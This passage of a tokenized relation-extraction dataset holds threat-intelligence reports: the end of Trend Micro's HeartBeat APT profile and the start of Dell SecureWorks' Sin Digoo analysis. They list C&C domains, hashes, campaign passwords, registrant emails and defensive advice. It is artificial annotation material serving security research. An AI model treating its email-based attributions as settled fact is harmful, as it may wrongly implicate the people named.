"researchers", "."], ["These", "variations", "in", "their", "RAT", "component", "indicate", "that", "it", "has", "since", "been", "undergoing", "development", "."], ["Command", "and", "Control"], ["HeartBeat", "Campaign", "Codes", "and", "Decoy", "Documents"], ["The", "campaign", "codes", "and", "decoy", "documents", "used", "by", "the", "HeartBeat", "attackers", "provided", "valuable", "insights", "on", "their", "campaigns", "."], ["In", "fact", ",", "majority", "of", "their", "campaign", "codes", "included", "number", "combinations", "which", "represented", "the", "month", "and", "date", "in", "MMDD", "format", "when", "the", "attack", "attempt", "was", "executed", "."], ["The", "rest", "of", "the", "campaign", "code", "string", "often", "describes", "the", "decoy", "document", "that", "was", "used", "in", "a", "specific", "campaign", "."], ["For", "instance", ",", "a", "campaign", "code", "from", "October", "2011", "is", "\u201c", "army-1022", "\u201d", "where", "attackers", "used", "a", "decoy", "document", "containing", "military", "-", "related", "information", "."], ["Campaign", "code", "The", "HeartBeat", "campaign", "\u2019s", "C&C", "domains", "appear", "to", "utilize", "a", "site", "redirection", "service", "."], ["Their", "C&C", "sites", "redirect", "to", "IP", "addresses", "from", "ISPs", "in", "Armenia", ",", "USA", ",", "Japan", ",", "India", "and", "Korea", "."], ["We", "observed", "that", "they", "updated", "the", "IP", "address", "of", "some", "of", "their", "C&C", "domains", "."], ["Likewise", ",", "all", "of", "their", "IP", "addresses", "belong", "to", "legitimate", "ISPs", "."], ["Considering", "this", ",", "we", "suspect", "that", "these", "IP", "addresses", "are", "compromised", "hosts", "that", "act", "as", "proxy", "servers", "which", "redirects", "traffic", "to", "the", "actual", "C&C", "servers", "."], ["Again", ",", "this", "adds", "another", "layer", "of", "anonymity", "to", "the", "HeartBeat", "perpetrators", "."], ["Domain", "IP", "Address", "ahnlab.myfw.us", "XXX.XXX.217.123", "/XXX.XX.121.84", "kissyou01.myfw.us", "XX.XXX.203.122", "/", "XX.XXX.20.103", "kita.myfw.us", "XXX.XXX.217.123", "/", "XXX.XX.121.84", "login.sbs.com.PassAs.us", "XXX.XXX.178.50", "mail2.myfw.us", "XX.XXX.15.63", "/"], ["XXX.XXX.198.93", "park007.myfw.us", "unknown", "snrp.UglyAs.com", "XXX.XXX.169.45", "www.banking.com.PassAs.us", "XXX.XXX.178.50", "www.huyang.go.kr.PassAs.us", "XXX.XXX.217.123", "/", "XX.XXX.136.115", "www.kinu.or.kr.rr.nu", "XXX.XXX.178.50", "www.kndu.ac.kr.myfw.us", "XXX.XXX.4.180", "young03.myfw.us", "XX.XXX.203.122", "Table", "1", "."], ["List", "of", "HeartBeat", "C&Cs", "PAGE", "8", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN", "Password", "1119HWP"], ["None", "kris0315"], ["None", "PDF-0417"], ["None", "gh-0525"], ["None", "0909", "-", "jpg", "qawsed", "0916", "qawsed", "jpg", "-", "jf-0925", "qawsed", "army-1022", "qawsed", "1103", "-", "ghui", "qawsed", "1113", "-", "minzhu", "qawsed", "ajh7884@han", "qawsed", "001", "qawsed", "0305", "-", "ziyoudang", "qawsed", "0326", "-", "xuehui", "qawsed", "0328", "-", "junf", "qawsed", "0329", "-", "mnd", "qawsed", "1q2w3e4r"], ["None", "0520", "-", "tiegang", "qawsed", "guohui-0604", "qawsed", "Table", "2", "."], ["Campaign", "codes", "used", "On", "the", "other", "hand", ",", "decoy", "documents", "\u2019", "contents", "were", "also", "very", "specific", "to", "their", "targets", "."], ["For", "example", ",", "some", "of", "these", "documents", "included", "logos", "of", "specific", "groups", "."], ["This", "information", "helped", "us", "identify", "their", "targeted", "organizations", "and", "communities", "in", "their", "previous", "campaigns", "."], ["PAGE", "9", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "Figure", "7", "."], ["Relationships", "between", "HeartBeat", "attack", "components", "Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns", "Attribution"], ["Clues", "relating", "to", "the", "attackers", "remain", "very", "limited", "."], ["Using", "compromised", "hosts", "as", "C&C", "proxy", "servers", "minimizes", "the", "possibility", "of", "tracking", "potential", "threat", "actors", "."], ["While", "a", "number", "of", "their", "campaign", "codes", "included", "Chinese", "words", "such", "as", "guohui", ",", "xuehui", "and", "minzhu", ",", "they", "appear", "to", "be", "comfortable", "using", "the", "English", "language", "."], ["Some", "of", "the", "C&C", "domain", "names", "even", "contained", "English", "words", "."], ["In", "addition", ",", "the", "binder", "tool", "and", "the", "RAT", "component", "are", "written", "in", "English", "."], ["For", "instance", ",", "some", "text", "from", "the", "packaged", "components", "\u2019", "body", "included", "\u201c", "Select", "Files", "!", "\u201d"], ["and", "\u201c", "Bind", "Success", "!", "\u201d"], [",", "while", "the", "RAT", "component", "included", "strings", "such", "as", "\u201c", "Uninstall", "\u2026", "ok", "\u201d", "and", "the", "name", "of", "the", "RAT", "itself", ",", "\u201c", "HeartBeat", ".", "\u201d"], ["Threat", "actors", "and", "entities", "that", "use", "collected", "information", "from", "targets", "may", "be", "two", "separate", "parties", "that", "are", "only", "related", "in", "a", "professional", "and", "malicious", "manner", "."], ["In", "this", "case", ",", "determining", "the", "latter", "may", "be", "impossible", "."], ["Likewise", ",", "it", "is", "very", "difficult", "to", "identify", "the", "threat", "actors", "behind", "the", "HeartBeat", "campaign", "given", "the", "limited", "amount", "of", "information", "available", "."], ["Conclusion"], ["The", "Heartbeat", "campaign", "has", "been", "successfully", "executing", "targeted", "attacks", "since", "2009", "."], ["In", "order", "for", "attackers", "to", "properly", "track", "their", "campaigns", "and", "victims", ",", "they", "used", "campaign", "codes", "that", "contained", "the", "campaign", "dates", "and", "strings", "that", "described", "specific", "campaigns", "."], ["These", "campaign", "codes", "are", "embedded", "in", "their", "RAT", "binaries", "and", "were", "sent", "to", "their", "C&C", "servers", "along", "with", "information", "regarding", "the", "targets", "\u2019", "system", "."], ["Additionally", ",", "they", "used", "a", "commercial", "site", "redirection", "service", "for", "their", "C&C", "domains", "."], ["These", "domains", "redirected", "to", "various", "IP", "addresses", "that", "belonged", "to", "legitimate", "ISPs", ",", "which", "may", "be", "compromised", "hosts", "that", "act", "as", "proxy", "servers", "."], ["This", "effectively", "hides", "the", "real", "location", "of", "the", "attackers", "behind", "HeartBeat", "."], ["While", "having", "an", "isolated", "target", "may", "have", "helped", "them", "stay", "under", "the", "security", "industry", "\u2019s", "radar", ",", "the", "attackers", "illustrated", "that", "they", "were", "very", "careful", "but", "persistent", "."], ["Understanding", "targeted", "campaigns", "and", "their", "methodologies", "is", "fundamental", "in", "protecting", "both", "end", "users", "and", "organizations", "."], ["Not", "only", "does", "it", "help", "in", "coming", "up", "with", "effective", "defensive", "strategies", "through", "multiple", "protection", "layers", ",", "it", "also", "helps", "with", "predicting", "possible", "targets", "in", "the", "future", "and", "ultimately", ",", "raise", "awareness", "."], ["As", "of", "this", "writing", ",", "the", "HeartBeat", "APT", "campaign", "remains", "an", "active", "targeted", "campaign", "."], ["Timeline"], ["We", "collected", "19", "set", "of", "samples", "related", "to", "HeartBeat", "campaign", "from", "November", "2009", "to", "June", "2012", "."], ["This", "translates", "to", "19", "campaigns", "where", "the", "vast", "majority", "of", "which", "were", "distributed", "between", "2011", "and", "2012", "."], ["Nonetheless", ",", "the", "limited", "number", "of", "samples", "we", "were", "able", "to", "obtain", "still", "means", "that", "the", "campaign", "is", "indeed", "persistent", "."], ["The", "isolated", "nature", "of", "this", "targeted", "attack", "and", "its", "small", "user", "base", "may", "only", "require", "the", "HeartBeat", "perpetrators", "to", "carry", "out", "minimal", "campaigns", "in", "order", "to", "infiltrate", "their", "targets", "."], ["Campaign", "Date"], ["(", "MM", "/", "DD", "/", "YY", ")", "MD5", "(", ".DLL", "component", ")"], ["Compile"], ["Date", "(", "MM", "/", "DD", "/", "YY", ")", "11/19/09", "7c6b44d8d87898e7e5deeeb1961b5ae6", "9/17/2009", "03/15/11", "fcf42cadb3a932989c8e2b29cef68861", "12/24/2010", "04/17/11", "aab129ffd3bf5ceeae2e0f332217bebc", "3/18/2011", "05/25/11"], ["86547d674e7c7da55e8cae359819832f", "5/6/2011", "09/09/111", "f947e63b14853a69b8ed2648869b5e10", "7/25/2011", "09/16/11"], ["7f1a633384ec97fae9d95d1df9e1135a", "7/25/2011", "09/25/11", "8816c5be1305488019769c81259dad2a", "9/21/2011", "10/22/11", "874025a66c2b9d9831c03d1bc114876a", "10/17/2011", "11/03/11", "4046dec1aa0eebb01fe7469184a95398", "10/31/2011", "11/13/11", "ba370b17dc9eb1d1e1c3187f0768064f", "10/31/2011", "12/2011", "51274cefb01cee981a09db83c984213d", "11/28/2011", "02/2012", "d1a2253361045f91ed1902e9ffe2cec3", "7/18/2011", "03/05/12", "20bb652e1d2679ed230102aa9676eca0", "3/1/2012", "03/26/12", "c5c0fea23138cddab96fe22b657f9132", "3/8/2012"], ["03/28/12", "ef2bc66ea69327d11d1859af26f5aef9", "3/8/2012", "03/29/12", "8e50af054d2c0b45c88082d53c4fc423", "3/8/2012", "04/2012", "b1e47ecd68c1c151866cec275716aa67", "4/18/2012", "05/20/12"], ["6d205e78fb7730066c116b0c2dffa398", "5/2/2012", "06/04/12"], ["5ec175512ba3c6e78597af48bbe6ca60", "5/2/2012", "Table", "3", "."], ["Specific", "dates", "of", "HeartBeat", "campaigns", "PAGE", "10", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["We", "did", "not", "obtain", "a", "campaign", "sample", "from", "2010", "."], ["However", ",", "we", "highly", "suspect", "that", "their", "operation", "was", "also", "active", "during", "that", "year", "."], ["In", "fact", ",", "we", "can", "see", "in", "the", "second", "MD5", "above", "that", "the", "sample", "was", "compiled", "in", "December", "24", ",", "2010", "."], ["Also", ",", "it", "is", "possible", "that", "some", "of", "the", "campaign", "\u2019s", "attacks", "may", "not", "have", "been", "escalated", "to", "antivirus", "firms", "by", "infected", "users", ",", "or", "simply", "remains", "undiscovered", "."], ["that", "contain", "file", "attachments", "using", "extensions", "such", "as", ".VBS", ",", ".BAT", ",", ".EXE", ",", ".PIF", "and", ".SCR", "files", "."], ["\u2022"], ["Avoid", "opening", "email", "attachments", "and", "clicking", "embedded", "links", "from", "unknown", "sources"], ["\u2022", "Block", "any", "file", "with", "more", "than", "one", "file", "type", "extension", "."], ["Defending", "against", "the", "HeartBeat", "Campaign", "\u2022"], ["When", "a", "computer", "is", "compromised", ",", "isolate", "it", "immediately", "from", "the", "network", "."], ["Essential", "components", "of", "defense", "against", "the", "HeartBeat", "campaign", "are", "security", "-", "related", "policies", "within", "enterprises", "."], ["Once", "an", "attack", "is", "identified", ",", "a", "good", "cleanup", "strategy", "should", "focus", "on", "determining", "the", "attack", "vector", "and", "cutting", "off", "communications", "with", "the", "C&C", "server", "."], ["It", "is", "also", "vital", "to", "determine", "the", "scope", "of", "the", "compromise", "and", "assessing", "the", "damage", "through", "data", "analysis", "and", "forensics", "."], ["\u2022"], ["Do", "n\u2019t", "save", "login", "credentials", "on", "the", "local", "computer", "."], ["\u2022", "Configure", "your", "system", "to", "show", "hidden", "files", "and", "folders", "and", "display", "file", "extensions", "."], ["The", "following", "best", "practices", "are", "also", "advised", ":", "\u2022", "Disable", "services", "that", "are", "related", "to", "the", "HeartBeat", "RAT", "component", "."], ["\u2022", "Enable", "system", "\u2019s", "firewall", "\u2022", "Keep", "software", "and", "operating", "systems", "updated", "with", "latest", "patches", "released", "by", "vendors", "to", "address", "vulnerabilities", "and", "exploits", "."], ["\u2022", "Block", "unused", "ports", "to", "disallow", "malware", "from", "using", "these", "ports", "to", "communicate", "and/or", "enforce", "commands", "."], ["\u2022", "Monitor", "network", "connections", "for", "any", "suspicious", "connection", "or", "connectivity", "."], ["\u2022", "Regularly", "update", "list", "of", "sites", "that", "are", "trusted", "."], ["\u2022"], ["Configure", "your", "email", "server", "to", "block", "or", "remove", "email", "PAGE", "11", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN", "Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components"], ["The", "following", "table", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "HeartBeat", "campaign", "."], ["Trend", "Micro", "recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet", "the", "real", "-", "time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component", "Protection", "Technology"], ["Trend", "Micro", "Solution", "HeartBeat", "TCP", "communication", "is", "blocked", "in", "the", "network", "layer", "as", "TCP_HBEAT_REQUEST", "Web", "Reputation", "Endpoint", "(", "Titanium", ",", "Worry", "-", "Free", "Business", "Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")"], ["Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security", ")"], ["Mobile", "(", "Mobile", "Security", ")", "TROJ_DRPBEAT", "and", "BKDR_HBEAT", "variants", "File", "Reputation"], ["(", "Antivirus", "/", "Anti", "-", "malware", ")", "Endpoint", "(", "Titanium", ",", "Worry", "-", "Free", "Business"], ["Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")"], ["Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security", ")"], ["Mobile", "(", "Mobile", "Security", ")", "XXX.XXX.217.123"], ["XXX.XX.121.84", "XX.XXX.203.122", "XX.XXX.20.103"], ["XXX.XXX.217.123", "XXX.XX.121.84"], ["XXX.XXX.178.50", "XX.XXX.15.63"], ["XXX.XXX.198.93", "XXX.XXX.169.45", "XXX.XXX.178.50", "XXX.XXX.217.123", "XX.XXX.136.115"], ["XXX.XXX.178.50", "XXX.XXX.4.180", "XX.XXX.203.122", "ahnlab.myfw.us", "kissyou01.myfw.us", "kita.myfw.us"], ["login.sbs.com.PassAs.us", "mail2.myfw.us", "park007.myfw.us", "snrp.UglyAs.com"], ["www.banking.com.PassAs.us", "www.huyang.go.kr.PassAs.us", "www.kinu.or.kr.rr.nu", "www.kndu.ac.kr.myfw.us", "young03.myfw.us", "Web", ",", "Domain", ",", "and", "IP", "Reputation", "Endpoint", "(", "Titanium", ",", "Worry", "-", "Free", "Business", "Security", ",", "OfficeScan", ")"], ["Server", "(", "Deep", "Security", ")"], ["Messaging", "(", "InterScan", "Messaging", "Security", ",", "ScanMail", "Suite", "for", "Microsoft", "Exchange", ")"], ["Network", "(", "Deep", "Discovery", ")"], ["Gateway", "(", "InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security", ")"], ["Mobile", "(", "Mobile", "Security", ")", "PAGE", "12", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN", "December", "2012", "|", "APT", "Campaign", "Quick", "Profile", ":", "HEARTBEAT"], ["Advanced", "persistent", "threats", "(", "APTs", ")", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific", "targets", "to", "maintain", "persistent", "presence", "within", "the", "victim", "\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because", "of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", "."], ["Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card", "and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["HEARTBEAT"], ["\u2022", "First", "Seen", "Individual", "targeted", "attacks", "are", "not", "one", "-", "off", "attempts", "."], ["Attackers", "continually", "try", "to", "get", "inside", "the", "target", "\u2019s", "network", "."], ["The", "\u201c", "HeartBeat", "\u201d", "campaign", "has", "been", "persistently", "pursuing", "government", "agencies", "since", "2009", "."], ["The", "samples", "collected", "related", "to", "this", "campaign", "covered", "attacks", "seen", "from", "November", "2009", "to", "June", "2012", ",", "although", "majority", "of", "the", "attacks", "were", "seen", "in", "2011", "and", "2012", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["The", "HeartBeat", "campaign", "targets", "South", "Korean", "government", "organizations", "and", "institutions", "like", "political", "parties", ",", "media", "outfits", ",", "a", "national", "policy", "research", "institute", ",", "a", "military", "branch", "of", "South", "Korean", "armed", "forces", ",", "a", "small", "business", "sector", "organization", ",", "and", "branches", "of", "the", "South", "Korean", "government", "."], ["\u2022", "Operations"], ["The", "1st", "-", "stage", "computer", "intrusions", "often", "use", "social", "engineering", "."], ["Attackers", "custom", "-", "fit", "attacks", "to", "their", "targets", "."], ["The", "threat", "actors", "behind", "HeartBeat", "install", "a", "RAT", "in", "system", "."], ["The", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which", "is", "actually", "a", "bundled", "file", "."], ["The", "bundled", "file", "contains", "both", "a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been", "packaged", "together", "using", "a", "binder", "tool", "."], ["The", "campaign", "\u2019s", "decoy", "documents", "used", "the", "file", "formats", ".JPG", ",", ".PDF", ",", "XLS", ",", "and", "HWP", ",", "the", "Korean", "government", "standard", "word", "processor", "format", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise", "Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", "."], ["A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["The", "following", "indicators", "suggest", "an", "infection", "by", "the", "HeartBeat", "campaign", ":", "contiguous", "02H", "bytes", "communication", "in", "the", "network", ",", "the", "presence", "of", "certain", "files", "and", "registries", "as", "detailed", "in", "the", "paper", ",", "and", "network", "connections", "to", "certain", "IPs", "and", "domains", ",", "including", "the", "presence", "of", "files", "detected", "as", "TROJ_DRPBEAT", "and", "BKDR_HBEAT", "."], ["\u2022"], ["Relationship", "with", "other", "APT", "Campaigns"], ["This", "attack", "does", "not", "seem", "to", "have", "any", "relationship", "with", "other", "APT", "campaigns", "."], ["PAGE", "13", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN", "TREND", "MICRO", "INCORPORATED", "TREND", "MICRO", "INC", ".", "Trend", "Micro", "Incorporated", "(", "TYO", ":", "4704", ";", "TSE", ":", "4704", ")", ",", "a", "global", "cloud", "security", "leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses", "and", "consumers", "."], ["A", "pioneer", "in", "server", "security", "with", "over", "20", "years", "\u2019", "experience", ",", "we", "deliver", "top", "-", "ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers", "\u2019", "and", "partners", "\u2019", "needs", ",", "stops", "new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud", "environments", "."], ["Powered", "by", "the", "industry", "-", "leading", "Trend", "Micro", "\u2122", "Smart", "Protection", "Network", "\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products", "and", "services", "stop", "threats", "where", "they", "emerge", "\u2014", "from", "the", "Internet", "."], ["They", "are", "supported", "by", "1,000", "+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N.", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U.S.", "toll", "free", ":", "1", "+800.228.5651", "Phone", ":", "1", "+408.257.1500"], ["Fax", ":", "1", "+408.257.2003", "www.trendmicro.com", "\u00a9", "2012", "by", "Trend", "Micro", ",", "Incorporated", "."], ["All", "rights", "reserved", "."], ["Trend", "Micro", "and", "the", "Trend", "Micro", "t", "-", "ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", "."], ["All", "other", "product", "or", "company", "names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "14", "|"], ["THE", "HEARTBEAT", "APT", "CAMPAIGN"]]}, {"vertexSet": [[{"name": "Between 2004 and 2011", "pos": [0, 4], "sent_id": 4, "type": "Time"}], [{"name": "jeno_1980@hotmail.com", "pos": [11, 12], "sent_id": 4, "type": "Email"}], [{"name": "Tawnya Grilth", "pos": [19, 21], "sent_id": 4, "type": "Person"}], [{"name": "Eric Charles", "pos": [24, 26], "sent_id": 4, "type": "Person"}], [{"name": "Advanced Persistent Threat", "pos": [33, 36], "sent_id": 9, "type": "Campaign"}], [{"name": "Enfal", "pos": [5, 6], "sent_id": 12, "type": "MalwareFamily"}], [{"name": "EtenFalcon", "pos": [13, 14], "sent_id": 12, "type": "MalwareFamily"}], [{"name": "RegSubsDat", "pos": [30, 31], "sent_id": 19, "type": "MalwareFamily"}], [{"name": "RegSubDat", "pos": [34, 35], "sent_id": 19, "type": "MalwareFamily"}], [{"name": "Kirpich", "pos": [38, 39], "sent_id": 19, "type": "MalwareFamily"}], [{"name": "Vietnam", "pos": [7, 8], "sent_id": 32, "type": "Country"}], [{"name": "Brunei", "pos": [9, 10], "sent_id": 32, "type": "Country"}], [{"name": "Myanmar", "pos": [12, 13], "sent_id": 32, "type": "Country"}], [{"name": "RegSubsDat", "pos": [16, 17], "sent_id": 32, "type": "Malware"}], [{"name": "Europe", "pos": [6, 7], "sent_id": 36, "type": "Region"}], [{"name": "Middle East", "pos": [9, 11], "sent_id": 36, "type": "Region"}], [{"name": "RegSubsDat", "pos": [14, 15], "sent_id": 36, "type": "Malware"}], [{"name": "Enfal", "pos": [16, 17], "sent_id": 36, "type": "Malware"}], [{"name": "China", "pos": [9, 10], "sent_id": 38, "type": "Country"}], [{"name": "GhostNet", "pos": [4, 5], "sent_id": 42, "type": "Malware"}], [{"name": "Sin Digoo", "pos": [18, 20], "sent_id": 42, "type": "Campaign"}], [{"name": "2011", "pos": [28, 29], "sent_id": 42, "type": "Time"}], [{"name": "Murcy", "pos": [13, 14], "sent_id": 44, "type": "Malware"}], [{"name": "123.120.96.0", "pos": [24, 25], "sent_id": 48, "type": "Address"}], [{"name": "114.248.80.0", "pos": [26, 27], "sent_id": 48, "type": "Address"}], [{"name": "114.248.96.0", "pos": [28, 29], "sent_id": 48, "type": "Address"}], [{"name": "RegSubsDat", "pos": [1, 2], "sent_id": 50, "type": "Malware"}], [{"name": "asia-online.us", "pos": [2, 3], "sent_id": 50, "type": "Indicator"}], [{"name": "king_public@hotmail.com", "pos": [14, 15], "sent_id": 50, "type": "Email"}], [{"name": "Cyb3rsleuth", "pos": [6, 7], "sent_id": 51, "type": "Indicator"}], [{"name": "Wang Liang Chen", "pos": [26, 29], "sent_id": 51, "type": "Person"}], [{"name": "jeno_1980@hotmail.com", "pos": [4, 5], "sent_id": 56, "type": "Account"}], [{"name": "socialup.net", "pos": [7, 8], "sent_id": 56, "type": "Host"}], [{"name": "blackhat", "pos": [5, 6], "sent_id": 61, "type": "Attacker"}], [{"name": "jzd", "pos": [25, 26], "sent_id": 71, "type": "Indicator"}], [{"name": "i-tobuy.com", "pos": [11, 12], "sent_id": 74, "type": "Host"}], [{"name": "jeno_1980@hotmail.com", "pos": [8, 9], "sent_id": 75, "type": "Account"}], [{"name": "xxgchappy", "pos": [22, 23], "sent_id": 75, "type": "Indicator"}], [{"name": "1stsale.net", "pos": [14, 15], "sent_id": 78, "type": "Host"}], [{"name": "john twk", "pos": [21, 23], "sent_id": 78, "type": "Indicator"}], [{"name": "xxgchappy@vip.sina.com", "pos": [28, 29], "sent_id": 78, "type": "Account"}], [{"name": "hooking Windows API functions", "pos": [23, 27], "sent_id": 89, "type": "Exploit"}], [{"name": "Jeno", "pos": [3, 4], "sent_id": 94, "type": "Indicator"}], [{"name": "123.6.89.98", "pos": [25, 26], "sent_id": 95, "type": "Address"}], [{"name": "king_public@hotmail.com", "pos": [39, 40], "sent_id": 95, "type": "Email"}], [{"name": "61.51.59.63", "pos": [45, 46], "sent_id": 95, "type": "Address"}], [{"name": "king-rose", "pos": [11, 14], "sent_id": 97, "type": "Indicator"}], [{"name": "Club-tom", "pos": [17, 20], "sent_id": 97, "type": "Indicator"}], [{"name": "e211f11c0b28434bf7f1c8fb510fa9ae", "pos": [31, 32], "sent_id": 97, "type": "Hash"}], [{"name": "wzy_100@hotmail.com", "pos": [25, 26], "sent_id": 100, "type": "Email"}], [{"name": "123.120.127.153", "pos": [5, 6], "sent_id": 101, "type": "Address"}], [{"name": "lankiller", "pos": [13, 14], "sent_id": 111, "type": "Exploit"}], [{"name": "Sin Digoo", "pos": [1, 3], "sent_id": 123, "type": "Campaign"}]], "labels": [{"r": "P32", "h": 13, "t": 12, "evidence": [32]}, {"r": "P32", "h": 13, "t": 11, "evidence": [32]}, {"r": "P32", "h": 13, "t": 10, "evidence": [32]}, {"r": "P32", "h": 16, "t": 15, "evidence": [36]}, {"r": "P32", "h": 16, "t": 14, "evidence": [36]}, {"r": "P32", "h": 17, "t": 15, "evidence": [36]}, {"r": "P32", "h": 17, "t": 14, "evidence": [36]}, {"r": "P32", "h": 16, "t": 18, "evidence": [36, 38]}, {"r": "P32", "h": 17, "t": 18, "evidence": [36, 38]}, {"r": "P22", "h": 20, "t": 22, "evidence": [42, 44]}, {"r": "P33", "h": 20, "t": 21, "evidence": [42]}, {"r": "P21", "h": 27, "t": 26, "evidence": [50]}, {"r": "P21", "h": 28, "t": 26, "evidence": [50]}, {"r": "P21", "h": 29, "t": 26, "evidence": [50, 51]}, {"r": "P4", "h": 31, "t": 32, "evidence": [56]}, {"r": "P4", "h": 36, "t": 35, "evidence": [74, 75]}, {"r": "P4", "h": 40, "t": 38, "evidence": [78]}, {"r": "P22", "h": 52, "t": 51, "evidence": [111, 123]}], "title": "201202DellSecureWorksSinDigoo", "sents": [["The", "Sin", "Digoo", "Affair", "URL", ":", "http://www.secureworks.com", "/", "research", "/", "threats", "/", "sindigoo/"], ["Date", ":", "29", "February", "2012"], ["Author", ":", "Joe", "Stewart", ",", "Director", "of", "Malware", "Research", ",", "Dell", "SecureWorks", "Counter", "Threat", "Unit", "Research", "Team", "\"", "We", "can", "not", "enter", "into", "informed", "alliances", "until", "we", "are", "acquainted", "with", "the", "designs", "of", "our", "neighbors", "and", "the", "plans", "of", "our", "adversaries", ".", "\"", "-", "Sun", "Tzu", ",", "The", "Art", "of", "War", "Introduction"], ["The", "story", "of", "the", "Sin", "Digoo", "affair", "begins", "with", "a", "set", "of", "Internet", "domain", "registrations", "dating", "back", "to", "2004", "."], ["Between", "2004", "and", "2011", ",", "a", "person", "using", "the", "email", "address", "jeno_1980@hotmail.com", "registered", "several", "domains", "using", "the", "names", "\"", "Tawnya", "Grilth", "\"", "and", "\"", "Eric", "Charles", "\"", "."], ["Curiously", ",", "all", "of", "the", "\"", "Tawnya", "Grilth", "\"", "domains", "showed", "the", "registrant", "'s", "physical", "address", "to", "be", "a", "post", "office", "box", "in", "the", "fictional", "/", "misspelled", "town", "of", "\"", "Sin", "Digoo", "\"", ",", "California", "."], ["Figure", "1", "."], ["Characteristics", "of", "domains", "registered", "by", "jeno_1980@hotmail.com", "."], ["In", "2006", "and", "2007", ",", "jeno_1980@hotmail.com", "registered", "a", "number", "of", "domains", "under", "the", "\"", "Tawnya", "Grilth", "\"", "alias", "that", "have", "appeared", "repeatedly", "on", "reports", "published", "by", "various", "automated", "malware", "analysis", "systems", "and", "antivirus", "websites", "."], ["The", "Dell", "SecureWorks", "CTUSM", "research", "team", "examined", "malware", "samples", "using", "these", "domains", "and", "concluded", "that", "these", "domains", "were", "involved", "in", "a", "larger", "pattern", "of", "malware", "-", "based", "espionage", ",", "sometimes", "referred", "to", "as", "Advanced", "Persistent", "Threat", "(", "APT", ")", "activity", "."], ["Espionage", "malware"], ["There", "are", "two", "primary", "malware", "families", "involved", "with", "the", "Sin", "Digoo", "domains", "."], ["One", "is", "known", "as", "\"", "Enfal", "\"", ",", "which", "is", "short", "for", "\"", "EtenFalcon", "\"", ",", "a", "string", "found", "inside", "early", "samples", "."], ["The", "involvement", "of", "actors", "using", "this", "malware", "for", "espionage", "was", "first", "detailed", "in", "2010", "in", "a", "joint", "report", "by", "the", "Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", "."], ["The", "report", ",", "titled", "\"", "Shadows", "in", "the", "Cloud", ":", "Investigating", "Cyber", "Espionage", "2.0", ",", "\"", "was", "a", "continuation", "of", "research", "from", "an", "earlier", "report", "titled", "\"", "Tracking", "GhostNet", ":", "Investigating", "a", "Cyber", "Espionage", "Network", "."], ["\""], ["A", "later", "report", "by", "antivirus", "firm", "Trend", "Micro", "titled", "\"", "The", "LURID", "Downloader", "\"", "further", "details", "a", "campaign", "of", "espionage", "by", "this", "malware", "against", "targets", "worldwide", "."], ["Figure", "2", "."], ["Sin", "Digoo", "connection", "to", "Enfal", "malware", "."], ["A", "second", "family", "of", "malware", "connecting", "to", "the", "\"", "Tawnya", "Grilth", "\"", "domains", "is", "less", "well", "-", "known", ",", "although", "a", "couple", "of", "antivirus", "companies", "have", "used", "the", "names", "\"", "RegSubsDat", "\"", ",", "\"", "RegSubDat", "\"", "or", "\"", "Kirpich", "\"", "to", "refer", "to", "it", "."], ["A", "recent", "variant", "was", "described", "by", "the", "information", "security", "firm", "CyberESI", "in", "a", "2011", "blog", "post", "titled", "\"", "India", "-", "United", "States", "Naval", "Cooperation.doc", "Analysis", "."], ["\""], ["Details", "regarding", "the", "earlier", "variant", "used", "in", "the", "Sin", "Digoo", "activity", "was", "first", "analyzed", "in", "a", "blog", "posting", "by", "Don", "C.", 